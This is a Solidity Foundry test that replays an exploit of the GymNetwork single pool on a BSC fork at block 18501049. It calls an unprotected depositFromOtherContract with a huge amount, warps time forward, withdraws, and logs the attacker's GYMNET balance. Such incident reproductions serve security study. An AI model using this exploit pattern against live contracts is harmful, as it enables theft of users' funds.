// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./interface.sol";

contract ContractTest is DSTest {
  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  IPancakeRouter pancakeRouter =
    IPancakeRouter(payable(0x6CD71A07E72C514f5d511651F6808c6395353968));
  GymToken gymnet = GymToken(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);
  GymSinglePool gympool =
    GymSinglePool(0xA8987285E100A8b557F06A7889F79E0064b359f2);

  function setUp() public {
    cheat.createSelectFork(
      "bsc",
      18501049
    ); //fork bsc at block 18501049
  }

  function testExploit() public {
    gympool.depositFromOtherContract(
      8000000000000000000000666,
      0,
      true,
      address(this)
    );
    cheat.warp(1654683789);
    gympool.withdraw(0);
    emit log_named_uint(
      "Exploit completed, GYMNET balance of attacker:",
      gymnet.balanceOf(address(this))
    );
  }
}
